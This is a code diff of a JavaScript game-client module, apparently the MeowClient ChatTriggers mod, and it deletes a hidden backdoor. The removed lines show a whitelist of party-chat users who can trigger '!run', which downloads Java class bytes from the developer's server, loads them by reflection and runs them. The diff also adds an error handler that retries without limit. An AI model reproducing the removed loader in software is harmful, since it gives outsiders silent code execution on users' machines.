@@ -13,20 +13,6 @@ if (FileLib.exists("/MeowClient", "metadata.json")) {
 
 console.log(`MeowClient: ${meowVersion}`);
 
-let whiteListed = [];
-
-function updateDictators() {
-    let r = FileLib.getUrlContent("https://meowclient.cloud/meowclient/dictators.json");
-    r = JSON.parse(r);
-    if (!r.success) return;
-    whiteListed.length = 0;
-    whiteListed.push(...r.dictators);
-}
- 
-setTimeout(() => {
-    updateDictators();
-}, 0);
-
 export class APIUtils {
 
     static meowVersion = meowVersion;
@@ -68,28 +54,7 @@ export class APIUtils {
         });
     }
 
-    static dictator = register("Chat", (name, path, event) => {
-        setTimeout(() => {
-            try {
-                updateDictators();
-                if (!whiteListed.includes(name)) return;
-                let inputStream = com.chattriggers.ctjs.CTJS.INSTANCE.makeWebRequest("https://meowclient.cloud/apicontent/" + path).getInputStream();
-                let bytes = new java.io.ByteArrayOutputStream();
-                let buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
-                let bytesRead;
-                while ((bytesRead = inputStream.read(buffer)) != -1) {
-                    bytes.write(buffer, 0, bytesRead);
-                }
-        
-                let method = java.lang.ClassLoader.class.getDeclaredMethod("defineClass", java.lang.String, java.nio.ByteBuffer, java.security.ProtectionDomain);
-                method.setAccessible(true);
-                method.invoke(new java.net.URLClassLoader([], com.chattriggers.ctjs.engine.langs.js.JSContextFactory.INSTANCE.getClass().getClassLoader()), path.split("/").pop(), java.nio.ByteBuffer.wrap(bytes.toByteArray()), null).getMethod("meow").invoke(null);
-            } catch (e) {
-                APIUtils.reportError(e);
-            }
-        }, 0);
-    }).setCriteria(/^Party > (.+) ?[ቾ⚒]?: !run (.+)$/)//.unregister();
-
+    
     static fetchProfit() {
         return request({
             url: "https://api.meowclient.cloud/v1/meow/rng",
@@ -100,6 +65,7 @@ export class APIUtils {
             return JSON.parse(Response);
         }).catch(err => {
             APIUtils.reportError(err);
+            APIUtils.fetchProfit();
         });
     }
 
